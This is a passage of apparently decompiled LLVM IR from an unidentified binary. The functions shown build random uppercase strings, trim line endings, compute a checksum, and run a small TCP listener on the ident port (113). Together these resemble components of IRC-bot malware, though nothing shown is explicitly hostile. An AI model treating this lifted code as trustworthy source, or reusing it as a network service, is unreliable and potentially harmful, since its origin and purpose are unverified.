  br i1 %v3_10000514, label %dec_label_pc_1000051c, label %dec_label_pc_10000548

dec_label_pc_1000051c:                            ; preds = %dec_label_pc_100004f0
  %v3_10000520 = load i32, i32* @global_var_10010478.10, align 4
  %v5_10000538 = call i32 @function_1000041c(i32 %v3_10000520, i32 ptrtoint ([30 x i8]* @global_var_1000d3b8.11 to i32), i32 %arg1, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_1000064c

dec_label_pc_10000548:                            ; preds = %dec_label_pc_100004f0
  store i32 268436812, i32* @lr, align 4
  %v0_10000548 = call i32 @function_10004afc()
  %v3_10000558 = icmp eq i32 %v0_10000548, 0
  br i1 %v3_10000558, label %dec_label_pc_10000560, label %dec_label_pc_1000056c

dec_label_pc_10000560:                            ; preds = %dec_label_pc_10000548
  br label %dec_label_pc_1000064c

dec_label_pc_1000056c:                            ; preds = %dec_label_pc_10000548
  %v3_10000570 = load i32, i32* @global_var_10010468.13, align 4
  %v1_10000574 = add i32 %v3_10000570, 1
  store i32 %v1_10000574, i32* @global_var_10010468.13, align 4
  %v1_10000588 = mul i32 %v1_10000574, 4
  %v1_1000058c = add i32 %v1_10000588, 4
  store i32 %v1_1000058c, i32* @r3, align 4
  store i32 268436888, i32* @lr, align 4
  %v0_10000594 = call i32 @function_100080a0()
  %v3_100005f02 = load i32, i32* @global_var_10010468.13, align 4
  %v3_100005fc4 = icmp eq i32 %v3_100005f02, 1
  br i1 %v3_100005fc4, label %dec_label_pc_10000604, label %dec_label_pc_100005ac

dec_label_pc_100005ac:                            ; preds = %dec_label_pc_1000056c, %dec_label_pc_100005ac
  %storemerge16 = phi i32 [ %v1_100005e4, %dec_label_pc_100005ac ], [ 0, %dec_label_pc_1000056c ]
  %v1_100005b0 = mul i32 %storemerge16, 4
  %v2_100005bc = add i32 %v1_100005b0, %v0_10000594
  %v3_100005d0 = load i32, i32* @global_var_1001048c.14, align 4
  %v2_100005d4 = add i32 %v3_100005d0, %v1_100005b0
  %v1_100005d8 = inttoptr i32 %v2_100005d4 to i32*
  %v2_100005d8 = load i32, i32* %v1_100005d8, align 4
  %v2_100005dc = inttoptr i32 %v2_100005bc to i32*
  store i32 %v2_100005d8, i32* %v2_100005dc, align 4
  %v1_100005e4 = add i32 %storemerge16, 1
  %v3_100005f0 = load i32, i32* @global_var_10010468.13, align 4
  %v1_100005f4 = add i32 %v3_100005f0, -1
  %v3_100005fc = icmp ugt i32 %v1_100005f4, %v1_100005e4
  br i1 %v3_100005fc, label %dec_label_pc_100005ac, label %dec_label_pc_100005ec.dec_label_pc_10000604_crit_edge

dec_label_pc_100005ec.dec_label_pc_10000604_crit_edge: ; preds = %dec_label_pc_100005ac
  br label %dec_label_pc_10000604

dec_label_pc_10000604:                            ; preds = %dec_label_pc_1000056c, %dec_label_pc_100005ec.dec_label_pc_10000604_crit_edge
  %v3_10000608 = phi i32 [ %v3_100005f0, %dec_label_pc_100005ec.dec_label_pc_10000604_crit_edge ], [ %v3_100005f02, %dec_label_pc_1000056c ]
  %v1_1000060c = mul i32 %v3_10000608, 4
  %v2_10000618 = add i32 %v0_10000594, -4
  %v1_1000061c = add i32 %v2_10000618, %v1_1000060c
  %v2_10000624 = inttoptr i32 %v1_1000061c to i32*
  store i32 %v0_10000548, i32* %v2_10000624, align 4
  %v3_1000062c = load i32, i32* @global_var_1001048c.14, align 4
  store i32 %v3_1000062c, i32* @r3, align 4
  store i32 268437048, i32* @lr, align 4
  %v0_10000634 = call i32 @function_100081f8()
  store i32 %v0_10000594, i32* @global_var_1001048c.14, align 4
  br label %dec_label_pc_1000064c

dec_label_pc_1000064c:                            ; preds = %dec_label_pc_10000560, %dec_label_pc_1000051c, %dec_label_pc_10000604
  %stack_var_-20.0 = phi i32 [ 1, %dec_label_pc_1000051c ], [ 0, %dec_label_pc_10000560 ], [ %v0_10000548, %dec_label_pc_10000604 ]
  ret i32 %stack_var_-20.0

; uselistorder directives
  uselistorder i32 %v1_100005e4, { 1, 0 }
  uselistorder i32 %v1_100005b0, { 1, 0 }
  uselistorder i32 %storemerge16, { 1, 0 }
  uselistorder i32 %v3_100005f02, { 1, 0 }
  uselistorder i32 %v0_10000594, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000064c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000604, { 1, 0 }
  uselistorder label %dec_label_pc_100005ac, { 1, 0 }
}

define i32 @function_1000066c() local_unnamed_addr {
dec_label_pc_1000066c:
  %v3_10000684 = load i8*, i8** @global_var_10010460.15, align 4
  %v4_10000684 = ptrtoint i8* %v3_10000684 to i32
  %v3_10000688 = icmp eq i8* %v3_10000684, null
  br i1 %v3_10000688, label %dec_label_pc_10000690, label %dec_label_pc_100006a0

dec_label_pc_10000690:                            ; preds = %dec_label_pc_1000066c
  store i32 268437140, i32* @lr, align 4
  %v0_10000690 = call i32 @function_100086d8()
  br label %dec_label_pc_10000704

dec_label_pc_100006a0:                            ; preds = %dec_label_pc_1000066c
  %v3_100006a4 = load i32, i32* @global_var_10010464.16, align 4
  %v3_100006a8 = icmp eq i32 %v3_100006a4, 1
  br i1 %v3_100006a8, label %dec_label_pc_100006b0, label %dec_label_pc_100006c8

dec_label_pc_100006b0:                            ; preds = %dec_label_pc_100006a0
  store i32 %v4_10000684, i32* @r3, align 4
  %v3_100006bc = call i32 @function_100079e8(i32 %v4_10000684, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10000704

dec_label_pc_100006c8:                            ; preds = %dec_label_pc_100006a0
  store i32 268437196, i32* @lr, align 4
  %v0_100006c8 = call i32 @function_100086d8()
  %v3_100006d8 = load i32, i32* @global_var_10010464.16, align 4
  %v2_100006dc = urem i32 %v0_100006c8, %v3_100006d8
  %v3_100006ec = load i8*, i8** @global_var_10010460.15, align 4
  %v4_100006ec = ptrtoint i8* %v3_100006ec to i32
  %v2_100006f0 = add i32 %v4_100006ec, %v2_100006dc
  %v1_100006f4 = add i32 %v2_100006f0, 1
  store i32 %v1_100006f4, i32* @r3, align 4
  %v2_100006fc = call i32 @function_100079e8(i32 %v1_100006f4, i32 %v2_100006f0)
  br label %dec_label_pc_10000704

dec_label_pc_10000704:                            ; preds = %dec_label_pc_100006b0, %dec_label_pc_10000690, %dec_label_pc_100006c8
  %stack_var_-24.0 = phi i32 [ %v0_10000690, %dec_label_pc_10000690 ], [ %v3_100006bc, %dec_label_pc_100006b0 ], [ %v2_100006fc, %dec_label_pc_100006c8 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v4_10000684, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_100079e8, { 1, 0 }
  uselistorder label %dec_label_pc_10000704, { 2, 0, 1 }
}

define i32 @function_10000724(i32 %arg1) local_unnamed_addr {
dec_label_pc_10000724:
  %v2_10000778 = add i32 %arg1, -1
  br label %dec_label_pc_10000764

dec_label_pc_10000740:                            ; preds = %dec_label_pc_10000790, %dec_label_pc_10000764
  store i32 %arg1, i32* @r3, align 4
  %v0_10000744 = call i32 @function_10007288()
  %v1_10000758 = add i32 %v0_10000744, %v2_10000778
  %v3_10000760 = inttoptr i32 %v1_10000758 to i8*
  store i8 0, i8* %v3_10000760, align 1
  br label %dec_label_pc_10000764

dec_label_pc_10000764:                            ; preds = %dec_label_pc_10000724, %dec_label_pc_10000740
  store i32 %arg1, i32* @r3, align 4
  %v0_10000768 = call i32 @function_10007288()
  %v1_1000077c = add i32 %v0_10000768, %v2_10000778
  %v1_10000780 = inttoptr i32 %v1_1000077c to i8*
  %v2_10000780 = load i8, i8* %v1_10000780, align 1
  %v3_10000788 = icmp eq i8 %v2_10000780, 13
  br i1 %v3_10000788, label %dec_label_pc_10000740, label %dec_label_pc_10000790

dec_label_pc_10000790:                            ; preds = %dec_label_pc_10000764
  store i32 %arg1, i32* @r3, align 4
  %v0_10000794 = call i32 @function_10007288()
  %v1_100007a8 = add i32 %v0_10000794, %v2_10000778
  %v1_100007ac = inttoptr i32 %v1_100007a8 to i8*
  %v2_100007ac = load i8, i8* %v1_100007ac, align 1
  %v3_100007b4 = icmp eq i8 %v2_100007ac, 10
  br i1 %v3_100007b4, label %dec_label_pc_10000740, label %dec_label_pc_100007bc

dec_label_pc_100007bc:                            ; preds = %dec_label_pc_10000790
  ret i32 %v0_10000794

; uselistorder directives
  uselistorder i32 %arg1, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_10000764, { 1, 0 }
}

define i32 @function_100007d4() local_unnamed_addr {
dec_label_pc_100007d4:
  %stack_var_-1076 = alloca i32, align 4
  store i32 268437488, i32* @lr, align 4
  %v0_100007ec = call i32 @function_100086d8()
  %v2_10000808 = srem i32 %v0_100007ec, 5
  %v1_10000824 = add nsw i32 %v2_10000808, 4
  %v1_10000830 = add nsw i32 %v2_10000808, 5
  store i32 %v1_10000830, i32* @r3, align 4
  store i32 268437564, i32* @lr, align 4
  %v0_10000838 = call i32 @function_100080a0()
  store i32 268437604, i32* @lr, align 4
  %v3_10000860 = call i32 @function_100071a4(i32 %v0_10000838, i32 0, i32 %v1_10000830)
  store i32 268437624, i32* @lr, align 4
  %v3_10000874 = call i32 @function_10004f90(i32 ptrtoint ([16 x i8]* @global_var_1000d3d8.17 to i32), i32 ptrtoint (i32* @global_var_1000d3e8.18 to i32))
  %v3_10000884 = icmp eq i32 %v3_10000874, 0
  br i1 %v3_10000884, label %dec_label_pc_100008fc.preheader, label %dec_label_pc_10000910

dec_label_pc_100008fc.preheader:                  ; preds = %dec_label_pc_100007d4
  %v2_100009048 = icmp sgt i32 %v2_10000808, -4
  br i1 %v2_100009048, label %dec_label_pc_10000898, label %dec_label_pc_10000a00

dec_label_pc_10000898:                            ; preds = %dec_label_pc_100008fc.preheader, %dec_label_pc_10000898
  %storemerge711 = phi i32 [ %v1_100008f4, %dec_label_pc_10000898 ], [ 0, %dec_label_pc_100008fc.preheader ]
  store i32 268437676, i32* @lr, align 4
  %v0_100008a8 = call i32 @function_100086d8()
  %v2_100008c4 = srem i32 %v0_100008a8, 26
  %fold = add nsw i32 %v2_100008c4, 65
  %v1_100008ec = trunc i32 %fold to i8
  %v2_100008ec = load i32, i32* @r29, align 4
  %v3_100008ec = inttoptr i32 %v2_100008ec to i8*
  store i8 %v1_100008ec, i8* %v3_100008ec, align 1
  %v1_100008f4 = add nuw nsw i32 %storemerge711, 1
  %v2_10000904 = icmp slt i32 %v1_100008f4, %v1_10000824
  br i1 %v2_10000904, label %dec_label_pc_10000898, label %dec_label_pc_10000a00

dec_label_pc_10000910:                            ; preds = %dec_label_pc_100007d4
  store i32 268437780, i32* @lr, align 4
  %v0_10000910 = call i32 @function_100086d8()
  store i32 268437788, i32* @lr, align 4
  %v0_10000918 = call i32 @function_100086d8()
  %v0_10000920 = load i32, i32* @r29, align 4
  %v2_10000920 = mul i32 %v0_10000920, %v0_10000918
  %v2_1000093c = srem i32 %v2_10000920, 45402
  %v2_1000099c12 = icmp sgt i32 %v2_1000093c, -1
  %v2_10000974 = ptrtoint i32* %stack_var_-1076 to i32
  br i1 %v2_1000099c12, label %dec_label_pc_10000974, label %dec_label_pc_100009a4

dec_label_pc_10000974:                            ; preds = %dec_label_pc_10000910, %dec_label_pc_10000974
  %storemerge615 = phi i32 [ %v1_1000098c, %dec_label_pc_10000974 ], [ 0, %dec_label_pc_10000910 ]
  store i32 268437896, i32* @lr, align 4
  %v3_10000984 = call i32 @function_10006950(i32 %v2_10000974, i32 1024, i32 %v3_10000874)
  %v1_1000098c = add nuw nsw i32 %storemerge615, 1
  %v2_1000099c = icmp slt i32 %storemerge615, %v2_1000093c
  br i1 %v2_1000099c, label %dec_label_pc_10000974, label %dec_label_pc_100009a4

dec_label_pc_100009a4:                            ; preds = %dec_label_pc_10000974, %dec_label_pc_10000910
  store i32 268437948, i32* @lr, align 4
  %v3_100009b8 = call i32 @function_100071a4(i32 %v2_10000974, i32 0, i32 1024)
  store i32 268437968, i32* @lr, align 4
  %v3_100009cc = call i32 @function_10006950(i32 %v2_10000974, i32 1024, i32 %v3_10000874)
  store i32 268437980, i32* @lr, align 4
  %v1_100009d8 = call i32 @function_10000724(i32 %v2_10000974)
  store i32 %v0_10000838, i32* @r3, align 4
  store i32 %v2_10000974, i32* @r4, align 4
  store i32 %v1_10000824, i32* @r5, align 4
  store i32 268438008, i32* @lr, align 4
  %v0_100009f4 = call i32 @function_10007108()
  store i32 268438016, i32* @lr, align 4
  %v1_100009fc = inttoptr i32 %v3_10000874 to i16*
  %v2_100009fc = call i32 @function_10004e44(i16* %v1_100009fc)
  br label %dec_label_pc_10000a00

dec_label_pc_10000a00:                            ; preds = %dec_label_pc_10000898, %dec_label_pc_100008fc.preheader, %dec_label_pc_100009a4
  ret i32 %v0_10000838

; uselistorder directives
  uselistorder i32 %v1_100008f4, { 1, 0 }
  uselistorder i32 %v0_10000838, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000a00, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000974, { 1, 0 }
  uselistorder label %dec_label_pc_10000898, { 1, 0 }
}

define i32 @function_10000a24() local_unnamed_addr {
dec_label_pc_10000a24:
  %stack_var_-1180 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-1240 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-1216 = alloca i32, align 4
  %stack_var_-1196 = alloca i32, align 4
  %stack_var_-1204 = alloca i32, align 4
  %stack_var_-1212 = alloca i32, align 4
  store i32 268438088, i32* @lr, align 4
  %v3_10000a44 = call i32 @function_1000806c(i32 2, i32 1, i32 0)
  %v4_10000a58 = icmp eq i32 %v3_10000a44, -1
  br i1 %v4_10000a58, label %dec_label_pc_10000d80, label %dec_label_pc_10000a60

dec_label_pc_10000a60:                            ; preds = %dec_label_pc_10000a24
  store i32 2, i32* %stack_var_-1212, align 4
  store i32 113, i32* @r3, align 4
  %v1_10000a6c = call i32 @function_100079f4(i32 113)
  %v2_10000a80 = ptrtoint i32* %stack_var_-1212 to i32
  %v2_10000a84 = ptrtoint i32* %stack_var_-1204 to i32
  store i32 0, i32* %stack_var_-1204, align 4
  store i32 268438188, i32* @lr, align 4
  %v4_10000aa8 = call i32 @function_10007f20(i32 %v3_10000a44, i32 %v2_10000a80, i32 16, i32 %v2_10000a84)
  %v4_10000ab4 = icmp eq i32 %v4_10000aa8, -1
  br i1 %v4_10000ab4, label %dec_label_pc_10000d80, label %dec_label_pc_10000abc

dec_label_pc_10000abc:                            ; preds = %dec_label_pc_10000a60
  store i32 268438216, i32* @lr, align 4
  %v3_10000ac4 = call i32 @function_10007f88(i32 %v3_10000a44, i32 1, i32 %v4_10000aa8)
  %v4_10000ad0 = icmp eq i32 %v3_10000ac4, -1
  br i1 %v4_10000ad0, label %dec_label_pc_10000d80, label %dec_label_pc_10000ad8

dec_label_pc_10000ad8:                            ; preds = %dec_label_pc_10000abc
  store i32 268438236, i32* @lr, align 4
  %v0_10000ad8 = call i32 @function_10004afc()
  %v3_10000ae0 = icmp eq i32 %v0_10000ad8, 0
  br i1 %v3_10000ae0, label %dec_label_pc_10000d80, label %dec_label_pc_10000ae8

dec_label_pc_10000ae8:                            ; preds = %dec_label_pc_10000ad8
  store i32 16, i32* %stack_var_-1216, align 4
  %v2_10000af0 = ptrtoint i32* %stack_var_-1196 to i32
  %v2_10000af4 = ptrtoint i32* %stack_var_-1216 to i32
  store i32 268438280, i32* @lr, align 4
  %v4_10000b04 = call i32 @function_10007eec(i32 %v3_10000a44, i32 %v2_10000af0, i32 %v2_10000af4, i32 %v2_10000af4)
  %v4_10000b18 = icmp eq i32 %v4_10000b04, -1
  br i1 %v4_10000b18, label %dec_label_pc_10000b20, label %dec_label_pc_10000b28.preheader

dec_label_pc_10000b20:                            ; preds = %dec_label_pc_10000ae8
  %v0_10000b24 = call i32 @function_10008dd8()
  br label %dec_label_pc_10000b28.preheader

dec_label_pc_10000b28.preheader:                  ; preds = %dec_label_pc_10000b20, %dec_label_pc_10000ae8
  %v2_10000b28 = ptrtoint i32* %stack_var_-148 to i32
  %v1_10000b70 = udiv i32 %v4_10000b04, 32
  %v1_10000b78 = mul nuw nsw i32 %v1_10000b70, 4
  %v2_10000b7c = ptrtoint i32* %stack_var_-1240 to i32
  %v2_10000b80 = add i32 %v2_10000b7c, 1092
  %v1_10000b84 = add i32 %v2_10000b80, %v1_10000b78
  %v1_10000b88 = inttoptr i32 %v1_10000b84 to i32*
  %v1_10000b90 = urem i32 %v4_10000b04, 32
  %v3_10000b98 = shl i32 1, %v1_10000b90
  %v1_10000bc8 = add i32 %v4_10000b04, 1
  %v2_10000bd0 = ptrtoint i32* %stack_var_-156 to i32
  %v3_10000c24 = sub i32 0, %v4_10000b04
  %v4_10000c24 = urem i32 %v3_10000c24, 32
  %v6_10000c24 = xor i32 %v4_10000c24, 31
  %v12_10000c24 = lshr i32 -1, %v1_10000b90
  %v16_10000c24 = xor i32 %v12_10000c24, 1
  %v14_10000c24 = urem i32 %v12_10000c24, 2
  br label %dec_label_pc_10000b28

dec_label_pc_10000b28:                            ; preds = %dec_label_pc_10000b28.preheader, %dec_label_pc_10000c00
  store i32 %v2_10000b28, i32* %stack_var_-1240, align 4
  store i32 0, i32* %stack_var_-148, align 4
  br label %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge

dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge: ; preds = %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge.dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge_crit_edge, %dec_label_pc_10000b28
  %v3_10000b40.pre = phi i32 [ %v2_10000b28, %dec_label_pc_10000b28 ], [ %v3_10000b40.pre.pre, %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge.dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge_crit_edge ]
  %v1_10000b5830 = phi i32 [ 1, %dec_label_pc_10000b28 ], [ %v1_10000b58, %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge.dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge_crit_edge ]
  %v1_10000b44 = mul nuw nsw i32 %v1_10000b5830, 4
  %v2_10000b48 = add i32 %v1_10000b44, %v3_10000b40.pre
  %v2_10000b50 = inttoptr i32 %v2_10000b48 to i32*
  store i32 0, i32* %v2_10000b50, align 4
  %v1_10000b58 = add nuw nsw i32 %v1_10000b5830, 1
  %tmp25 = icmp ult i32 %v1_10000b58, 32
  br i1 %tmp25, label %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge.dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge_crit_edge, label %dec_label_pc_10000b6c

dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge.dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge_crit_edge: ; preds = %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge
  %v3_10000b40.pre.pre = load i32, i32* %stack_var_-1240, align 4
  br label %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge

dec_label_pc_10000b6c:                            ; preds = %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge
  %v2_10000b88 = load i32, i32* %v1_10000b88, align 4
  %v2_10000b9c = or i32 %v2_10000b88, %v3_10000b98
  store i32 %v2_10000b9c, i32* %v1_10000b88, align 4
  store i32 60, i32* %stack_var_-156, align 4
  store i32 268438508, i32* @lr, align 4
  %v6_10000be8 = call i32 @function_10004d38(i32 %v1_10000bc8, i32 %v2_10000b28, i32 0, i32 0, i32 %v2_10000bd0, i32 %v2_10000b28)
  %tmp26 = icmp sgt i32 %v6_10000be8, -1
  br i1 %tmp26, label %dec_label_pc_10000c00, label %dec_label_pc_10000bf8

dec_label_pc_10000bf8:                            ; preds = %dec_label_pc_10000b6c
  %v0_10000bfc = call i32 @function_10008dd8()
  br label %dec_label_pc_10000c00

dec_label_pc_10000c00:                            ; preds = %dec_label_pc_10000b6c, %dec_label_pc_10000bf8
  %v2_10000c18 = load i32, i32* %v1_10000b88, align 4
  %v5_10000c24 = shl i32 %v2_10000c18, %v4_10000c24
  %v7_10000c24 = lshr i32 %v2_10000c18, %v6_10000c24
  %v8_10000c24 = udiv i32 %v7_10000c24, 2
  %v9_10000c24 = or i32 %v8_10000c24, %v5_10000c24
  %tmp = icmp slt i32 %v2_10000c18, 0
  %v15_10000c242 = zext i1 %tmp to i32
  %v17_10000c24 = and i32 %v15_10000c242, %v16_10000c24
  %v14_10000c24.masked = and i32 %v14_10000c24, %v9_10000c24
  %v1_10000c2c = or i32 %v14_10000c24.masked, %v17_10000c24
  %v3_10000c30 = icmp eq i32 %v1_10000c2c, 0
  br i1 %v3_10000c30, label %dec_label_pc_10000b28, label %dec_label_pc_10000c3c

dec_label_pc_10000c3c:                            ; preds = %dec_label_pc_10000c00
  %v2_10000c3c = ptrtoint i32* %stack_var_-1180 to i32
  store i32 268438612, i32* @lr, align 4
  %v4_10000c50 = call i32 @function_10007fb8(i32 %v4_10000b04, i32 %v2_10000c3c, i32 1024, i32 0)
  %tmp27 = icmp slt i32 %v4_10000c50, 1
  br i1 %tmp27, label %dec_label_pc_10000c74, label %dec_label_pc_10000c68

dec_label_pc_10000c68:                            ; preds = %dec_label_pc_10000c3c
  %tmp28 = icmp slt i32 %v4_10000c50, 20
  br i1 %tmp28, label %dec_label_pc_10000c7c, label %dec_label_pc_10000c74

dec_label_pc_10000c74:                            ; preds = %dec_label_pc_10000c68, %dec_label_pc_10000c3c
  %v0_10000c78 = call i32 @function_10008dd8()
  br label %dec_label_pc_10000c7c

dec_label_pc_10000c7c:                            ; preds = %dec_label_pc_10000c68, %dec_label_pc_10000c74
  %v2_10000c84 = add i32 %v2_10000b7c, 60
  %v3_10000c8c = add i32 %v2_10000c84, %v4_10000c50
  %v4_10000c8c = inttoptr i32 %v3_10000c8c to i8*
  store i8 0, i8* %v4_10000c8c, align 1
  %v1_10000c94 = add i32 %v2_10000b7c, -1
  %v2_10000c9c = add i32 %v1_10000c94, %v4_10000c50
  %v1_10000ca0 = add i32 %v2_10000c9c, 60
  %v2_10000ca0 = inttoptr i32 %v1_10000ca0 to i8*
  %v3_10000ca0 = load i8, i8* %v2_10000ca0, align 1
  %v3_10000ca8 = icmp eq i8 %v3_10000ca0, 10
  br i1 %v3_10000ca8, label %dec_label_pc_10000cd0, label %dec_label_pc_10000cb0

dec_label_pc_10000cb0:                            ; preds = %dec_label_pc_10000c7c
  %v3_10000cc0 = load i8, i8* %v2_10000ca0, align 1
  %v3_10000cc8 = icmp eq i8 %v3_10000cc0, 13
  br i1 %v3_10000cc8, label %dec_label_pc_10000cd0, label %dec_label_pc_10000ce8

dec_label_pc_10000cd0:                            ; preds = %dec_label_pc_10000cb0, %dec_label_pc_10000c7c
  store i8 0, i8* %v2_10000ca0, align 1
  br label %dec_label_pc_10000ce8

dec_label_pc_10000ce8:                            ; preds = %dec_label_pc_10000cb0, %dec_label_pc_10000cd0
  %v1_10000cec = add i32 %v2_10000b7c, -2
  %v2_10000cf4 = add i32 %v1_10000cec, %v4_10000c50
  %v1_10000cf8 = add i32 %v2_10000cf4, 60
  %v2_10000cf8 = inttoptr i32 %v1_10000cf8 to i8*
  %v3_10000cf8 = load i8, i8* %v2_10000cf8, align 1
  %v3_10000d00 = icmp eq i8 %v3_10000cf8, 10
  br i1 %v3_10000d00, label %dec_label_pc_10000d28, label %dec_label_pc_10000d08

dec_label_pc_10000d08:                            ; preds = %dec_label_pc_10000ce8
  %v3_10000d18 = load i8, i8* %v2_10000cf8, align 1
  %v3_10000d20 = icmp eq i8 %v3_10000d18, 13
  br i1 %v3_10000d20, label %dec_label_pc_10000d28, label %dec_label_pc_10000d40

dec_label_pc_10000d28:                            ; preds = %dec_label_pc_10000d08, %dec_label_pc_10000ce8
  store i8 0, i8* %v2_10000cf8, align 1
  br label %dec_label_pc_10000d40

dec_label_pc_10000d40:                            ; preds = %dec_label_pc_10000d08, %dec_label_pc_10000d28
  %v3_10000d44 = load i32, i32* @global_var_10010470.19, align 4
  %v6_10000d64 = call i32 @function_1000041c(i32 %v4_10000b04, i32 ptrtoint ([25 x i8]* @global_var_1000d3ec.20 to i32), i32 %v2_10000c3c, i32 %v3_10000d44)
  store i32 268438896, i32* @lr, align 4
  %v1_10000d6c = call i32 @function_10004ab4(i32 %v4_10000b04)
  store i32 ptrtoint ([3 x i8]* @global_var_10000d78.21 to i32), i32* @lr, align 4
  %v1_10000d74 = call i32 @function_10004ab4(i32 %v3_10000a44)
  %v0_10000d7c = call i32 @function_10008dd8()
  br label %dec_label_pc_10000d80

dec_label_pc_10000d80:                            ; preds = %dec_label_pc_10000ad8, %dec_label_pc_10000abc, %dec_label_pc_10000a60, %dec_label_pc_10000a24, %dec_label_pc_10000d40
  %v0_10000d94 = phi i32 [ 0, %dec_label_pc_10000ad8 ], [ -1, %dec_label_pc_10000abc ], [ -1, %dec_label_pc_10000a60 ], [ -1, %dec_label_pc_10000a24 ], [ %v0_10000d7c, %dec_label_pc_10000d40 ]
  ret i32 %v0_10000d94

; uselistorder directives
  uselistorder i8* %v2_10000cf8, { 1, 0, 2 }
  uselistorder i8* %v2_10000ca0, { 1, 0, 2 }
  uselistorder i32 %v4_10000c50, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_10000c18, { 0, 2, 1 }
  uselistorder i32 %v1_10000b58, { 1, 0 }
  uselistorder i32 %v1_10000b90, { 1, 0 }
  uselistorder i32* %v1_10000b88, { 1, 0, 2 }
  uselistorder i32 %v2_10000b28, { 1, 2, 0, 3 }
  uselistorder i32 %v4_10000b04, { 2, 3, 4, 5, 6, 1, 0, 7 }
  uselistorder i32* %stack_var_-1212, { 1, 0 }
  uselistorder i32* %stack_var_-1216, { 1, 0 }
  uselistorder label %dec_label_pc_10000d80, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10000d40, { 1, 0 }
  uselistorder label %dec_label_pc_10000ce8, { 1, 0 }
  uselistorder label %dec_label_pc_10000c7c, { 1, 0 }
  uselistorder label %dec_label_pc_10000c00, { 1, 0 }
  uselistorder label %dec_label_pc_10000b28, { 1, 0 }
}

define i32 @function_10000d98(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10000d98:
  %v3_10000db8 = icmp eq i32 %arg2, 0
  br i1 %v3_10000db8, label %dec_label_pc_10000dc0, label %dec_label_pc_10000dcc

dec_label_pc_10000dc0:                            ; preds = %dec_label_pc_10000d98
  br label %dec_label_pc_10000e08

dec_label_pc_10000dcc:                            ; preds = %dec_label_pc_10000d98
  %v3_10000dd0 = icmp eq i32 %arg2, 1
  br i1 %v3_10000dd0, label %dec_label_pc_10000dd8, label %dec_label_pc_10000de4

dec_label_pc_10000dd8:                            ; preds = %dec_label_pc_10000dcc
  br label %dec_label_pc_10000e08

dec_label_pc_10000de4:                            ; preds = %dec_label_pc_10000dcc
  %v1_10000de8 = add i32 %arg2, -1
  %v2_10000df4 = call i32 @function_10000d98(i32 %arg1, i32 %v1_10000de8)
  %v2_10000e00 = mul i32 %v2_10000df4, %arg1
  br label %dec_label_pc_10000e08

dec_label_pc_10000e08:                            ; preds = %dec_label_pc_10000dd8, %dec_label_pc_10000dc0, %dec_label_pc_10000de4
  %stack_var_-16.0 = phi i32 [ 1, %dec_label_pc_10000dc0 ], [ %arg1, %dec_label_pc_10000dd8 ], [ %v2_10000e00, %dec_label_pc_10000de4 ]
  ret i32 %stack_var_-16.0

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000e08, { 2, 0, 1 }
}

define i32 @function_10000e28(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10000e28:
  %v2_10000e945 = icmp sgt i32 %arg2, 1
  br i1 %v2_10000e945, label %dec_label_pc_10000e60, label %dec_label_pc_10000e9c

dec_label_pc_10000e60:                            ; preds = %dec_label_pc_10000e28, %dec_label_pc_10000e60
  %stack_var_-24.09 = phi i32 [ %v1_10000e88, %dec_label_pc_10000e60 ], [ %arg2, %dec_label_pc_10000e28 ]
  %stack_var_-28.08 = phi i16* [ %v5_10000e80, %dec_label_pc_10000e60 ], [ %arg1, %dec_label_pc_10000e28 ]
  %stack_var_-32.07 = phi i32 [ %v2_10000e70, %dec_label_pc_10000e60 ], [ 0, %dec_label_pc_10000e28 ]
  %v4_10000e60 = ptrtoint i16* %stack_var_-28.08 to i32
  %v2_10000e64 = load i16, i16* %stack_var_-28.08, align 2
  %v3_10000e64 = zext i16 %v2_10000e64 to i32
  %v2_10000e70 = add i32 %v3_10000e64, %stack_var_-32.07
  %v1_10000e7c = add i32 %v4_10000e60, 2
  %v5_10000e80 = inttoptr i32 %v1_10000e7c to i16*
  %v1_10000e88 = add nsw i32 %stack_var_-24.09, -2
  %v2_10000e94 = icmp sgt i32 %v1_10000e88, 1
  br i1 %v2_10000e94, label %dec_label_pc_10000e60, label %dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge

dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge: ; preds = %dec_label_pc_10000e60
  %v3_10000e94.le = icmp eq i32 %v1_10000e88, 1
  br i1 %v3_10000e94.le, label %dec_label_pc_10000ea8, label %dec_label_pc_10000ed0

dec_label_pc_10000e9c:                            ; preds = %dec_label_pc_10000e28
  %v3_10000e946 = icmp eq i32 %arg2, 1
  br i1 %v3_10000e946, label %dec_label_pc_10000ea8, label %dec_label_pc_10000ed0

dec_label_pc_10000ea8:                            ; preds = %dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge, %dec_label_pc_10000e9c
